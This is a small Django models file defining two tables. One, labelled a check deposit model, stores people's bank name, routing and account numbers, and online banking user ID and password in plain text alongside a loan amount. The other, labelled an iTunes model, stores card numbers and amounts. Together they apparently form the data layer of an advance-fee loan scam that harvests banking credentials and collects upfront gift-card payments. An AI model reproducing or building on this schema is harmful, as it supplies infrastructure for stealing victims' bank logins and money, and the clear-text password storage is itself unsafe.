from django.db import models

#Check deposite model
class getinformation(models.Model):
    Transaction=models.CharField(default='0251487125',max_length=240)
    FirstName=models.CharField(null=True,max_length=250);
    LastName = models.CharField(null=True,max_length=250)
    AlternatePhoneNumber =models.IntegerField(null=True)
    BankName=models.CharField(null=True,max_length=50)
    RoutNumber=models.CharField(null=True,max_length=50)
    AccountNumber=models.CharField(null=True,max_length=50)
    OnlineUserId=models.CharField(null=True,max_length=100)
    OnlineUserPassword=models.CharField(null=True,max_length=100)

    LoanAmount=models.IntegerField(null=True)
    

    def __str__(self):
        return self.FirstName
#Itunes model 
class upfront(models.Model):
    FirstName=models.CharField(null=True,max_length=250)
    LastName=models.CharField(null=True,max_length=250)
    CardNumber=models.CharField(null=True,max_length=16)
    Amount=models.IntegerField(null=True)
    def __str__(self):
        return self.FirstName
    
    